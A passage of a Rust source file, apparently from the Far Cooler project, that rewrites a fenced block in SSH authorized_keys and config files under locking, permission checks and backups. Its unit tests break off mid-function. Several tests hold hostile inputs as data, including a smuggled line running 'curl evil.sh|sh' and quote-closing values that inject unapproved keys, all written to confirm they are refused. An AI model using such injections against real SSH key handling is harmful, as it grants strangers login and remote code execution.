/// now, and whatever it answers is written before the lock is released. Its own
/// error type comes back untouched — `revoke` refuses a client id that is not
/// there, and that refusal is a decision it makes from inside the lock — which
/// is why `E` is generic and only has to be able to carry a `FenceError`.
///
/// A damaged fence refuses BEFORE the closure is called. There is no honest
/// block to hand over: guessing where an unterminated one ends is how a rewrite
/// deletes lines Far Cooler did not write.
///
/// Everything `write` refuses, this refuses, and by the same code — the
/// descriptor-anchored open, the ownership and mode checks, the backup, the
/// temp-file-and-rename. `write` remains for callers that compose the whole
/// block from scratch and have nothing to read first: `~/.ssh/config` through the
/// FFI is one, where nothing inside the fence is distinguishable as somebody
/// else's and so there is nothing to preserve.
pub fn update<T, E>(
    path: &Path,
    markers: Markers<'_>,
    placement: Placement,
    decide: impl FnOnce(&[Entry]) -> Result<(Change, T), E>,
) -> Result<T, E>
where
    E: From<FenceError>,
{
    let name = path.file_name().ok_or(FenceError::Missing)?;
    let directory = open_fence_dir(path.parent().ok_or(FenceError::Missing)?)?;
    let _lock = hold_lock(&directory, name)?;

    // Inside the lock, and that is the entire point of this function. Moving
    // these three lines above `hold_lock` restores the old shape, and
    // `two_concurrent_enrollments_both_survive` fails when they are.
    let current = read_at(&directory, name)?;
    let text = current.as_ref().map(|(text, _)| text.as_str()).unwrap_or_default();
    let entries = parse_within(text, markers)?;

    let (change, answer) = decide(&entries)?;
    if let Change::Write { entries, foreign } = change {
        write_locked(&directory, name, current.as_ref(), markers, &entries, &foreign, placement)?;
    }
    Ok(answer)
}

/// The write itself, with the lock already held and the file already read.
///
/// Split out so `write` and `update` cannot drift: one of them reads for itself
/// and the other reads for its caller, and everything after that — the read-back
/// check, the durable backup, the temp file, the two fsyncs, the rename relative
/// to the directory descriptor — is the same or it is a second write path that
/// gets to be wrong on its own.
fn write_locked(
    directory: &OwnedFd,
    name: &std::ffi::OsStr,
    current: Option<&(String, RawMode)>,
    markers: Markers<'_>,
    entries: &[String],
    foreign: &[String],
    placement: Placement,
) -> Result<(), FenceError> {
    let text = current.map(|(text, _)| text.as_str()).unwrap_or_default();
    let mode = current.map(|(_, mode)| *mode).unwrap_or(0o600);
    let rebuilt = rebuilt(text, markers, entries, foreign, placement)?;

    // The backup is durable BEFORE the rename, so that a machine that loses
    // power in the middle of this has either the original file or the original
    // file and a copy of it — never a half-written new one and no way back.
    if let Some((text, _)) = current {
        back_up(directory, name, text)?;
    }

    let temp = suffixed(name, ".farcooler-new");
    // A leftover temp from an interrupted write must not be inherited: `O_EXCL`
    // is what makes the create fail rather than reuse somebody's file, and the
    // unlink is what makes the retry succeed.
    ignoring_absent(rustix::fs::unlinkat(directory, temp.as_os_str(), AtFlags::empty()))?;
    let file = rustix::fs::openat(
        directory,
        temp.as_os_str(),
        OFlags::WRONLY | OFlags::CREATE | OFlags::EXCL | OFlags::CLOEXEC | OFlags::NOFOLLOW,
        Mode::from_raw_mode(mode),
    )
    .map_err(io)?;
    let mut file = std::fs::File::from(file);
    file.write_all(rebuilt.as_bytes())?;
    // The rename is atomic; the CONTENTS reaching the disk are not, and a
    // rename that lands before the bytes do leaves a file of zeros where
    // somebody's keys were.
    file.sync_all()?;
    drop(file);

    rustix::fs::renameat(directory, temp.as_os_str(), directory, name).map_err(io)?;
    // And the rename itself has to be durable, or a crash leaves the directory
    // entry pointing at neither file.
    rustix::fs::fsync(directory).map_err(io)?;
    Ok(())
}

/// The directory the file lives in, opened so that nothing can be swapped out
/// from under the rest of the write.
///
/// Every path this then uses is relative to the returned descriptor. That is
/// the point: `O_NOFOLLOW` on `~/.ssh/authorized_keys` checks only the last
/// component, so an attacker who replaces `.ssh` with a symlink AFTER the check
/// and BEFORE the rename redirects the new file into a directory they control —
/// and the file in question is the list of keys that may log in here. Holding
/// the directory open by descriptor means the rename cannot land anywhere else,
/// whatever the path resolves to by then.
///
/// The directory ABOVE it — the home directory — is opened the ordinary way,
/// symlinks and all. It is not attacker-controlled in any threat model that
/// this write survives anyway, and refusing to follow it would refuse every
/// macOS temporary directory, `/var` being a symlink to `/private/var`.
fn open_fence_dir(directory: &Path) -> Result<OwnedFd, FenceError> {
    let flags = OFlags::RDONLY | OFlags::DIRECTORY | OFlags::CLOEXEC;
    let opened = match (directory.parent(), directory.file_name()) {
        // The ordinary shape: a `.ssh` inside a home directory.
        (Some(above), Some(leaf)) if !above.as_os_str().is_empty() => {
            let anchor = rustix::fs::open(above, flags, Mode::empty()).map_err(|e| match e {
                rustix::io::Errno::NOENT => FenceError::Missing,
                e => FenceError::Io(e.into()),
            })?;
            // A runner where nobody has ever used SSH has no `.ssh` yet, and
            // 0700 is what sshd's own StrictModes insists on.
            ignoring_present(rustix::fs::mkdirat(
                &anchor,
                leaf,
                Mode::from_raw_mode(0o700 as RawMode),
            ))?;
            rustix::fs::openat(&anchor, leaf, flags | OFlags::NOFOLLOW, Mode::empty())
        }
        // A path with no directory part at all, or one directly under the root:
        // there is no component left to anchor, so this is as good as it gets.
        _ => {
            let directory =
                if directory.as_os_str().is_empty() { Path::new(".") } else { directory };
            rustix::fs::open(directory, flags, Mode::empty())
        }
    };
    let directory = opened.map_err(|e| match e {
        rustix::io::Errno::NOENT => FenceError::Missing,
        e => FenceError::Io(e.into()),
    })?;
    verify(&directory, "the directory that file lives in")?;
    Ok(directory)
}

/// Refuse a directory or file that is not ours, or that anyone else can write.
///
/// The same rule sshd applies to this file under `StrictModes`, applied at the
/// descriptor that is actually being used rather than at a path that may mean
/// something else by now. A group-writable `.ssh` is a directory in which
/// somebody else can replace `authorized_keys`, so writing keys into it would
/// be enrolling a device into a file that is not really the runner owner's.
fn verify(fd: &OwnedFd, what: &str) -> Result<(), FenceError> {
    let stat = rustix::fs::fstat(fd).map_err(io)?;
    if stat.st_uid != rustix::process::geteuid().as_raw() {
        return Err(refused(format!("{what} belongs to another user")));
    }
    if stat.st_mode as RawMode & 0o022 != 0 {
        return Err(refused(format!("{what} is writable by other users")));
    }
    Ok(())
}

/// Serialize Far Cooler's own writers against each other.
///
/// On a sibling file rather than on `authorized_keys` itself, so that holding
/// the lock never depends on having the real file open — the write replaces
/// that file by rename, and a lock on a descriptor whose name has been reused
/// protects nothing.
///
/// The retry is not defensive programming, it is a measured fact about macOS:
/// when two threads call `openat(dir, name, O_CREAT)` on the same name at the
/// same moment, one of them comes back ENOENT rather than opening the file the
/// other just made — reproducibly, in roughly every such pair, through raw
/// `libc` as well as through rustix. Without the retry, the second of two
/// concurrent enrollments fails on a file that plainly exists. `O_CREAT`
/// racing with itself is exactly the shape this call has, because a lock file
/// must be created before it can be locked.
fn hold_lock(directory: &OwnedFd, name: &std::ffi::OsStr) -> Result<OwnedFd, FenceError> {
    let lock = suffixed(name, ".farcooler-lock");
    let mut attempt = 0;
    let file = loop {
        let opened = rustix::fs::openat(
            directory,
            lock.as_os_str(),
            OFlags::RDWR | OFlags::CREATE | OFlags::CLOEXEC | OFlags::NOFOLLOW,
            Mode::from_raw_mode(0o600 as RawMode),
        );
        match opened {
            Ok(file) => break file,
            // Bounded, because ENOENT also means a directory that really has
            // gone — this holds it open by descriptor, so if it was removed no
            // number of retries will bring it back.
            Err(rustix::io::Errno::NOENT) if attempt < 100 => {
                attempt += 1;
                std::thread::sleep(std::time::Duration::from_millis(1));
            }
            Err(e) => return Err(io(e)),
        }
    };
    rustix::fs::flock(&file, FlockOperation::LockExclusive).map_err(io)?;
    Ok(file)
}

/// The file's contents and its mode, or `None` if it is not there yet.
fn read_at(
    directory: &OwnedFd,
    name: &std::ffi::OsStr,
) -> Result<Option<(String, RawMode)>, FenceError> {
    // `O_NONBLOCK` because `O_NOFOLLOW` refuses a symlink and says nothing about
    // a FIFO: opening one of those for reading blocks until somebody writes to
    // it, which would hang the daemon rather than refuse.
    let opened = rustix::fs::openat(
        directory,
        name,
        OFlags::RDONLY | OFlags::CLOEXEC | OFlags::NOFOLLOW | OFlags::NONBLOCK,
        Mode::empty(),
    );
    let file = match opened {
        Ok(file) => file,
        Err(rustix::io::Errno::NOENT) => return Ok(None),
        Err(e) => return Err(FenceError::Io(e.into())),
    };
    let what = name.to_string_lossy().into_owned();
    verify(&file, &what)?;
    let stat = rustix::fs::fstat(&file).map_err(io)?;
    let kind = rustix::fs::FileType::from_raw_mode(stat.st_mode as RawMode);
    if kind != rustix::fs::FileType::RegularFile {
        return Err(refused(format!("{what} is not a regular file")));
    }

    let mut bytes = Vec::new();
    std::fs::File::from(file).read_to_end(&mut bytes)?;
    // Refused rather than read lossily. `from_utf8_lossy` would replace the
    // offending bytes with U+FFFD, and this rewrites the whole file — so a
    // stray byte in somebody else's comment would come back as a corrupted
    // line, in the file that decides who may log in.
    let text = String::from_utf8(bytes).map_err(|_| {
        refused(format!("{what} is not UTF-8, so rewriting it would corrupt a line"))
    })?;
    Ok(Some((text, stat.st_mode as RawMode & 0o777)))
}

/// The file as it was, plus a checksum of it.
///
/// A backup nobody can tell is intact is not evidence. The checksum file is in
/// `shasum -c` format on purpose: recovering from this must not require Far
/// Cooler to be running, or installed, or working.
fn back_up(directory: &OwnedFd, name: &std::ffi::OsStr, text: &str) -> Result<(), FenceError> {
    use sha2::Digest as _;
    let backup = suffixed(name, ".farcooler-backup");
    let mut file = std::fs::File::from(create(directory, backup.as_os_str())?);
    file.write_all(text.as_bytes())?;
    file.sync_all()?;

    let digest = sha2::Sha256::digest(text.as_bytes());
    let hex: String = digest.iter().map(|b| format!("{b:02x}")).collect();
    let sums = create(directory, suffixed(&backup, ".sha256").as_os_str())?;
    let mut sums = std::fs::File::from(sums);
    sums.write_all(format!("{hex}  {}\n", backup.to_string_lossy()).as_bytes())?;
    sums.sync_all()?;
    Ok(())
}

/// Create or truncate a file beside the fenced one, never through a symlink.
fn create(directory: &OwnedFd, name: &std::ffi::OsStr) -> Result<OwnedFd, FenceError> {
    rustix::fs::openat(
        directory,
        name,
        OFlags::WRONLY | OFlags::CREATE | OFlags::TRUNC | OFlags::CLOEXEC | OFlags::NOFOLLOW,
        Mode::from_raw_mode(0o600 as RawMode),
    )
    .map_err(io)
}

/// Where a fence goes in a file that does not have one yet.
///
/// `authorized_keys` does not care: sshd reads every line and the order of
/// entries carries no meaning, so a new block at the end is fine and keeps the
/// diff at the bottom where a person expects it.
///
/// `~/.ssh/config` cares completely. It is **first**-match-wins per keyword, so
/// an `Include ~/.ssh/config.d/*` or a `Host *` above our block silently wins
/// every `IdentityFile`, `User` and `HostName` we wrote — and appending is the
/// one placement that reliably does nothing at all. That file needs `First`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Placement {
    /// After everything already in the file. The default, and right for
    /// `authorized_keys`.
    Last,
    /// Before everything already in the file, including any `Include`.
    First,
}

/// The file as it should be: the block replaced, everything else untouched.
///
/// Line terminators are carried through exactly as they were found — the lines
/// outside the fence are handed back with the bytes that ended them, so a file
/// with CRLF endings does not quietly become a file with LF endings on the
/// first enrollment.
fn rebuilt(
    current: &str,
    markers: Markers<'_>,
    entries: &[String],
    foreign: &[String],
    placement: Placement,
) -> Result<String, FenceError> {
    for line in entries.iter().chain(foreign) {
        // A caller cannot be allowed to write a marker or a newline into the
        // block: either one produces a file whose fence this refuses to read
        // afterwards, which would mean no device could be enrolled or revoked
        // again without hand-editing.
        if line.contains(['\r', '\n'])
            || line.trim_end() == markers.begin
            || line.trim_end() == markers.end
        {
            return Err(refused("an entry contained a newline or a fence marker".into()));
        }
    }

    let lines: Vec<&str> = current.split_inclusive('\n').collect();
    let (before, after) = match fence_span(&lines, markers)? {
        // An existing fence is rewritten where it already is. Moving someone's
        // block because a placement rule says so would be a surprise, and for
        // `~/.ssh/config` it would also silently change which keywords win.
        Some((begin, end)) => (lines[..begin].concat(), lines[end + 1..].concat()),
        None => match placement {
            Placement::Last => (current.to_string(), String::new()),
            Placement::First => (String::new(), current.to_string()),
        },
    };

    let mut rebuilt = before;
    // A file whose last line has no newline gets one before anything is added
    // after it, which is exactly the bug that appending has and this does not.
    if !rebuilt.is_empty() && !rebuilt.ends_with('\n') {
        rebuilt.push('\n');
    }
    if !entries.is_empty() || !foreign.is_empty() {
        rebuilt.push_str(markers.begin);
        rebuilt.push('\n');
        for line in entries.iter().chain(foreign) {
            rebuilt.push_str(line);
            rebuilt.push('\n');
        }
        rebuilt.push_str(markers.end);
        rebuilt.push('\n');
    }
    rebuilt.push_str(&after);

    // What is about to be written must read back as what was asked for. This is
    // cheap, and it is the difference between a bug in this function being a
    // failed enrollment and it being a file nobody can enroll into again.
    match parse_within(&rebuilt, markers) {
        Ok(read_back) if read_back.len() == entries.len() + foreign.len() => Ok(rebuilt),
        Ok(_) => Err(refused("the rewritten file did not read back as itself".into())),
        Err(e) => Err(e),
    }
}

/// `authorized_keys` → `authorized_keys.farcooler-backup`, and friends.
fn suffixed(name: &std::ffi::OsStr, suffix: &str) -> std::ffi::OsString {
    let mut out = name.to_os_string();
    out.push(suffix);
    out
}

fn ignoring_absent(result: Result<(), rustix::io::Errno>) -> Result<(), FenceError> {
    match result {
        Ok(()) | Err(rustix::io::Errno::NOENT) => Ok(()),
        Err(e) => Err(FenceError::Io(e.into())),
    }
}

fn ignoring_present(result: Result<(), rustix::io::Errno>) -> Result<(), FenceError> {
    match result {
        Ok(()) | Err(rustix::io::Errno::EXIST) => Ok(()),
        Err(e) => Err(FenceError::Io(e.into())),
    }
}

fn io(e: rustix::io::Errno) -> FenceError {
    FenceError::Io(e.into())
}

fn refused(why: String) -> FenceError {
    FenceError::Io(std::io::Error::new(std::io::ErrorKind::PermissionDenied, why))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A valid ed25519 public key, chosen for being obviously synthetic.
    ///
    /// Real bytes rather than a plausible-looking string: `from_openssh` decodes
    /// the base64 and checks the length the blob declares, so a fixture that is
    /// merely the right shape parses as nothing and every assertion about a
    /// parsed key would be testing the refusal path instead.
    const KEY: &str = "AAAAC3NzaC1lZDI1NTE5AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

    /// A second one, so a test can tell two entries apart.
    const OTHER_KEY: &str =
        "AAAAC3NzaC1lZDI1NTE5AAAAIBERERERERERERERERERERERERERERERERERERERERER";

    /// A real, tiny, valid RSA key.
    ///
    /// Short because its modulus is 32 bytes, which nothing here objects to and
    /// no test depends on: what is being tested is that a key whose ALGORITHM
    /// is not ed25519 is refused for that reason and not for being malformed,
    /// and a truncated fixture would pass that assertion for the wrong one.
    const RSA: &str = "ssh-rsa \
        AAAAB3NzaC1yc2EAAAADAQABAAAAIH+rq6urq6urq6urq6urq6urq6urq6urq6urq6urq6sB \
        someone@laptop";

    /// One enrolled device, inside the fence, with a stranger's key above it.
    fn one() -> String {
        format!(
            "ssh-rsa AAAAsomeone-elses-key nothing-to-do-with-us\n\
             {BEGIN}\n\
             restrict,command=\"farcoolerd --stdio --client abc123 --scope control\" \
             ssh-ed25519 {KEY} farcooler-iPhone-t7xq9vd8\n\
             {END}\n"
        )
    }

    /// Only what is inside the fence is ours.
    #[test]
    fn entries_outside_the_fence_are_not_read_as_ours() {
        let entries = parse(&one()).expect("parse");
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].client_id, "abc123");
        assert_eq!(entries[0].scope, Scope::Control);
        assert_eq!(entries[0].label, "farcooler-iPhone-t7xq9vd8");
    }

    /// A file with no fence has no entries, and that is not an error.
    #[test]
    fn a_file_with_no_fence_is_empty_rather_than_damaged() {
        let entries = parse("ssh-rsa AAAAonly-theirs me@laptop\n").expect("parse");
        assert!(entries.is_empty());
    }

    /// A fence that opens and never closes is damage, and damage refuses.
    ///
    /// The alternative is guessing where the block ends, and a wrong guess
    /// rewrites lines Far Cooler did not write. Refusing loses a feature;
    /// guessing loses someone's access to their own runner.
    #[test]
    fn an_unterminated_fence_refuses_rather_than_guesses() {
        let text = format!("{BEGIN}\nrestrict,command=\"x\" ssh-ed25519 {KEY} k\n");
        match parse(&text) {
            Err(FenceError::Damaged(_)) => {}
            other => panic!("an unterminated fence was accepted: {other:?}"),
        }
    }

    /// Two fences is damage too.
    #[test]
    fn a_second_fence_refuses() {
        let text = format!("{BEGIN}\n{END}\n{BEGIN}\n{END}\n");
        assert!(matches!(parse(&text), Err(FenceError::Damaged(_))));
    }

    /// One value in must never be two lines out.
    ///
    /// authorized_keys is line-oriented and every line may carry options
    /// BEFORE the key, so appending a received string can append a second
    /// entry granting a stranger a key that runs a command on every
    /// connection. Nothing about the write is malformed and it succeeds.
    #[test]
    fn a_second_line_smuggled_into_a_key_is_refused() {
        let hostile = format!(
            "ssh-ed25519 {KEY} ok\n\
             command=\"curl evil.sh|sh\" ssh-ed25519 {OTHER_KEY} them"
        );
        assert!(matches!(
            render(&hostile, "phone", "c1", Scope::Control, Grant::FarCooler, None),
            Err(Rejected::MultiLine)
        ));
    }

    /// A leading options field is not a key.
    #[test]
    fn an_options_field_in_the_received_key_is_refused() {
        let hostile = format!("command=\"sh\" ssh-ed25519 {KEY} x");
        assert!(render(&hostile, "phone", "c1", Scope::Control, Grant::FarCooler, None).is_err());
    }

    /// Ed25519 only, so nothing arrives that this has not reasoned about.
    #[test]
    fn a_non_ed25519_key_is_refused() {
        assert!(matches!(
            render(RSA, "phone", "c1", Scope::Control, Grant::FarCooler, None),
            Err(Rejected::Algorithm)
        ));
    }

    /// The comment is ours, not theirs.
    ///
    /// from_openssh KEEPS the comment it parsed, so trailing text is a valid
    /// comment rather than a parse error. Rebuilding from key_data is what
    /// actually regenerates it.
    #[test]
    fn the_comment_is_regenerated_from_the_label_we_chose() {
        let key = format!("ssh-ed25519 {KEY} whatever they/typed");
        let line = render(&key, "iPhone 17", "c1", Scope::Control, Grant::FarCooler, None)
            .expect("render");
        assert!(line.contains("farcooler-iPhone-17-"), "label not ours: {line}");
        assert!(!line.contains("they/typed"), "their comment survived: {line}");
        assert!(!line.contains('\n'), "a newline reached the line: {line}");
    }

    /// A restricted entry, every time, at every scope.
    #[test]
    fn every_entry_is_restricted_and_forced() {
        let key = format!("ssh-ed25519 {KEY} x");
        let line =
            render(&key, "iPhone", "c1", Scope::Read, Grant::FarCooler, None).expect("render");
        assert!(line.starts_with("restrict,command=\""), "not restricted: {line}");
        assert!(line.contains("--client c1"), "no client id: {line}");
        assert!(line.contains("--scope read"), "no scope: {line}");
    }

    /// The forced command names a path, and a channel's own daemon.
    ///
    /// This assertion exists because its absence let the bug in: `render` shipped
    /// a bare `farcoolerd` while every other place that reaches for a daemon —
    /// `remote::daemon_command`, `runner_install::daemon_name`, the Mac app's
    /// `~/.local/bin` symlinks — deliberately did not, and no test noticed the
    /// disagreement. `runner_install::daemon_name`'s own comment records that it
    /// was two spellings once. This is the third.
    ///
    /// Both halves are checked because they fail differently and independently. A
    /// missing path is a device that enrolls and then cannot connect on any
    /// runner whose login shell does not put `~/.local/bin` on PATH. A missing
    /// channel is worse for being silent: the device connects, to the wrong
    /// install's database and tmux server.
    ///
    /// Asserted against `Channel::daemon_binary_name` rather than a literal, so
    /// this cannot pass by agreeing with a stale copy of the rule.
    #[test]
    fn the_forced_command_names_this_channels_daemon_by_path() {
        let key = format!("ssh-ed25519 {KEY} x");
        let line =
            render(&key, "iPhone", "c1", Scope::Read, Grant::FarCooler, None).expect("render");
        let expected = farcooler_protocol::CHANNEL.daemon_binary_name();
        assert!(
            line.contains(&format!("command=\"~/.local/bin/{expected} --stdio")),
            "the forced command does not name {expected} by path: {line}"
        );
        // And not the bare name, which is the exact shape of the defect: a
        // `contains` on the path alone would still pass if the line somehow
        // carried both.
        assert!(
            !line.contains("command=\"farcoolerd"),
            "the forced command still leans on PATH: {line}"
        );
    }

    /// The client id is inside the quotes, so it can close them.
    ///
    /// Not in the plan this was written from, and the same bug as the one above
    /// wearing a different coat: `--client x" ssh-ed25519 …` ends the forced
    /// command and appends a key nobody approved, on one line, in a file that
    /// then parses perfectly.
    #[test]
    fn a_client_id_that_would_close_the_quote_is_refused() {
        let key = format!("ssh-ed25519 {KEY} x");
        let hostile = format!("c1\" ssh-ed25519 {OTHER_KEY} them");
        assert!(matches!(
            render(&key, "phone", &hostile, Scope::Control, Grant::FarCooler, None),
            Err(Rejected::ClientId)
        ));
        assert!(matches!(
            render(&key, "phone", "", Scope::Control, Grant::FarCooler, None),
            Err(Rejected::ClientId)
        ));
    }

    /// An unspecified scope is a field somebody forgot, not a request for all of it.
    #[test]
    fn an_unscoped_enrollment_is_refused_rather_than_granted_everything() {
        let key = format!("ssh-ed25519 {KEY} x");
        assert!(matches!(
            render(&key, "phone", "c1", Scope::Unspecified, Grant::FarCooler, None),
            Err(Rejected::Unscoped)
        ));
    }

    /// A rendered line parses back to the key we were given.
    #[test]
    fn a_rendered_line_round_trips() {
        let key = format!("ssh-ed25519 {KEY} x");
        let line = render(&key, "iPhone", "c1", Scope::Control, Grant::FarCooler, None)
            .expect("render");
        let text = format!("{BEGIN}\n{line}\n{END}\n");
        let entries = parse(&text).expect("parse");
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].client_id, "c1");
    }

    /// A line inside the fence that is not ours is reported, not dropped.
    ///
    /// Dropping it would mean the next write deleted a key someone added by
    /// hand inside our block. It is listed as foreign so a person can see it.
    #[test]
    fn a_foreign_line_inside_the_fence_is_kept_and_reported() {
        let text = format!("{BEGIN}\nssh-ed25519 {OTHER_KEY} someone\n{END}\n");
        let entries = parse(&text).expect("parse");
        assert_eq!(entries.len(), 1);
        assert!(entries[0].client_id.is_empty(), "a foreign line claimed a client id");
    }

    /// 32 bytes of X25519 public key is 43 characters of unpadded base64.
    const NODE_KEY: &str = "3q2-7wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

    #[test]
    fn a_node_key_lands_in_the_forced_command() {
        let key = format!("ssh-ed25519 {KEY} x");
        let line =
            render(&key, "phone", "c1", Scope::Read, Grant::FarCooler, Some(NODE_KEY)).unwrap();
        assert!(line.contains(&format!("--node-key {NODE_KEY}")), "no node key: {line}");
        assert!(line.starts_with("restrict,command=\""), "not restricted: {line}");
    }

    #[test]
    fn a_line_without_a_node_key_carries_no_flag() {
        let key = format!("ssh-ed25519 {KEY} x");
        let line = render(&key, "phone", "c1", Scope::Read, Grant::FarCooler, None).unwrap();
        assert!(!line.contains("--node-key"), "flag written for None: {line}");
    }

    #[test]
    fn a_rendered_node_key_reads_back() {
        let key = format!("ssh-ed25519 {KEY} x");
        let line =
            render(&key, "phone", "c1", Scope::Read, Grant::FarCooler, Some(NODE_KEY)).unwrap();
        assert_eq!(entry_from_line(&line).node_key, NODE_KEY);
    }

    /// The node key is interpolated into a quoted forced command, so it is a third
    /// way to smuggle a line in beside the client id and the label.
    #[test]
    fn a_node_key_that_could_end_the_command_is_refused() {
        let key = format!("ssh-ed25519 {KEY} x");
        for hostile in ["ab\" ssh-ed25519 AAAA them", "ab cd", "ab\nrestrict", ""] {
            let out = render(&key, "phone", "c1", Scope::Read, Grant::FarCooler, Some(hostile));
            assert!(matches!(out, Err(Rejected::NodeKey)), "accepted {hostile:?}: {out:?}");
        }
    }

    /// Key B is a plain unrestricted line with no forced command, so it has
    /// nowhere to put a node key and must not silently drop one.
    #[test]
    fn a_shell_line_refuses_a_node_key() {
        let key = format!("ssh-ed25519 {KEY} x");
        let out = render(&key, "mac", "c1", Scope::HostAdmin, Grant::Shell, Some(NODE_KEY));
        assert!(matches!(out, Err(Rejected::NodeKey)), "shell line took a node key: {out:?}");
    }

    #[test]
    fn a_foreign_line_has_no_node_key() {
        let entry = entry_from_line(&format!("ssh-ed25519 {OTHER_KEY} someone"));
        assert_eq!(entry.node_key, "");
    }

    // -----------------------------------------------------------------------
    // `with_node_key`: the migration path
    //
    // A device enrolled before the tunnel existed registers a node key over
    // the access it already holds, and its line is REBUILT rather than edited.
    // -----------------------------------------------------------------------

    /// The line already in the file, as the parser reads it.
    fn enrolled(scope: Scope, grant: Grant, node_key: Option<&str>) -> Entry {
        let key = format!("ssh-ed25519 {KEY} x");
        let line = render(&key, "iPhone 15", "c1", scope, grant, node_key).expect("render");
        entry_from_line(&line)
    }

    /// Everything except the node key comes back byte-identical.
    ///
    /// The whole claim of this call: it adds a route and changes nothing else.
    /// A rewrite that moved the fingerprint would be a different key — the
    /// device could no longer log in — and one that moved the comment would
    /// rename the device in Settings on every migration, which is what a
    /// re-render from `entry.label` would do (`comment_for` wraps `farcooler-`
    /// around whatever it is given).
    #[test]
    fn a_migrated_line_changes_only_its_node_key() {
        let before = enrolled(Scope::Control, Grant::FarCooler, None);
        assert_eq!(before.node_key, "", "the fixture already carried one");

        let line = with_node_key(&before, NODE_KEY).expect("a Key A line takes a node key");
        let after = entry_from_line(&line);

        assert_eq!(after.node_key, NODE_KEY);
        assert_eq!(after.fingerprint, before.fingerprint);
        assert_eq!(after.client_id, before.client_id);
        assert_eq!(after.scope, before.scope);
        assert_eq!(after.label, before.label);
        assert!(!after.shell_access);
        // And the ONE difference, stated as a difference: strip the flag back
        // out and the two lines are the same string.
        assert_eq!(line.replace(&format!(" --node-key {NODE_KEY}"), ""), before.line);
    }

    /// A device that regenerated its node key replaces the one on its line
    /// rather than accumulating a second flag the parser would read past.
    #[test]
    fn a_second_registration_replaces_the_first() {
        const OTHER_NODE_KEY: &str = "3q2-7wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE";
        let before = enrolled(Scope::Read, Grant::FarCooler, Some(NODE_KEY));
        let after = entry_from_line(&with_node_key(&before, OTHER_NODE_KEY).expect("re-register"));
        assert_eq!(after.node_key, OTHER_NODE_KEY);
        assert_eq!(after.line.matches("--node-key").count(), 1, "two flags: {}", after.line);
    }

    /// Key B has no forced command, so there is nowhere to put this — and
    /// rewriting it into one would take the Mac's shell away, which is the key
    /// Zed, git and Terminal use.
    #[test]
    fn a_plain_line_refuses_a_node_key_here_too() {
        let plain = enrolled(Scope::HostAdmin, Grant::Shell, None);
        assert!(plain.shell_access, "the fixture is not a plain line");
        let out = with_node_key(&plain, NODE_KEY);
        assert!(matches!(out, Err(Rejected::NodeKey)), "a plain line took one: {out:?}");
    }

    /// A key somebody added by hand is not ours to rewrite at all.
    #[test]
    fn a_foreign_line_is_never_rewritten() {
        let foreign = entry_from_line(&format!("ssh-ed25519 {OTHER_KEY} someone"));
        assert!(foreign.client_id.is_empty(), "the fixture is not foreign");
        let out = with_node_key(&foreign, NODE_KEY);
        assert!(matches!(out, Err(Rejected::NodeKey)), "a foreign line was rewritten: {out:?}");
    }

    /// The same hostile strings `render` refuses, refused on the same terms.
    /// This is the second door into the forced command and it must not be the
    /// unlocked one.
    #[test]
    fn a_node_key_that_could_end_the_command_is_refused_on_migration_too() {
        let before = enrolled(Scope::Read, Grant::FarCooler, None);
        for hostile in ["ab\" ssh-ed25519 AAAA them", "ab cd", "ab\nrestrict", ""] {
            let out = with_node_key(&before, hostile);
            assert!(matches!(out, Err(Rejected::NodeKey)), "accepted {hostile:?}: {out:?}");
        }
    }

    /// A line whose scope word this build does not have reads back as
    /// `Unspecified`, and `scope_word` renders `Unspecified` as `host_admin` —
    /// so re-rendering one would silently promote a word this daemon cannot
    /// read into the whole runner. Refusing leaves the line exactly as it was.
    #[test]
    fn a_line_with_a_scope_this_build_cannot_read_is_left_alone() {
        let key = format!("ssh-ed25519 {KEY} x");
        let line = render(&key, "phone", "c1", Scope::Read, Grant::FarCooler, None).unwrap();
        let future = entry_from_line(&line.replace("--scope read", "--scope fleet_admin"));
        assert_eq!(future.scope, Scope::Unspecified, "the fixture's scope was readable");
        assert_eq!(future.client_id, "c1", "the fixture stopped being one of ours");

        let out = with_node_key(&future, NODE_KEY);
        assert!(
            matches!(out, Err(Rejected::Unscoped)),
            "an unreadable scope was rewritten: {out:?}"
        );
    }

    // -----------------------------------------------------------------------
    // Key B: the plain line
    //
    // A Mac needs two keys, and the second one is an ordinary SSH key, because
    // Zed opens `ssh://{host}{path}` and a forced command has no shell to give
    // it. See `Grant`.
    // -----------------------------------------------------------------------

    /// A plain line, with the device named in the only field it has.
    #[test]
    fn a_shell_line_is_plain_and_names_its_device_in_its_comment() {
        let key = format!("ssh-ed25519 {KEY} x");
        let line = render(&key, "MacBook Air", "mac-1", Scope::HostAdmin, Grant::Shell, None)
            .expect("render");
        assert!(line.starts_with("ssh-ed25519 "), "a shell line carried options: {line}");
        assert!(!line.contains("restrict"), "a shell line was restricted: {line}");
        assert!(!line.contains("command="), "a shell line carried a forced command: {line}");
        assert!(line.contains("farcooler-shell-"), "nothing says Far Cooler wrote it: {line}");
        assert!(line.ends_with(".mac-1"), "the device is not named: {line}");
    }

    /// It reads back as OURS — that is what makes it managed.
    ///
    /// And at no scope, because the line grants none: no Far Cooler session can
    /// arrive on it, so reporting one would be reporting a grant that does not
    /// exist. What it grants is a shell, which is what `shell_access` says.
    #[test]
    fn a_shell_line_round_trips_as_ours_and_claims_no_scope() {
        let key = format!("ssh-ed25519 {KEY} x");
        let line = render(&key, "MacBook Air", "mac.1_2", Scope::HostAdmin, Grant::Shell, None)
            .expect("render");
        let entries = parse(&format!("{BEGIN}\n{line}\n{END}\n")).expect("parse");
        assert_eq!(entries.len(), 1);
        // A dotted id on purpose: the comment's own delimiter is a dot, and an
        // id that contains one must still come back whole.
        assert_eq!(entries[0].client_id, "mac.1_2");
        assert!(entries[0].shell_access, "a plain line of ours was not reported as shell access");
        assert_eq!(entries[0].scope, Scope::Unspecified);
        assert!(entries[0].fingerprint.starts_with("SHA256:"));
    }

    /// A restricted line is not shell access, and says so.
    #[test]
    fn a_restricted_line_is_not_reported_as_shell_access() {
        let entries = parse(&one()).expect("parse");
        assert!(!entries[0].shell_access, "a forced-command line offered a shell");
    }

    /// The comment is the only field a plain line has, so it is regenerated too.
    #[test]
    fn a_shell_line_gets_our_comment_rather_than_theirs() {
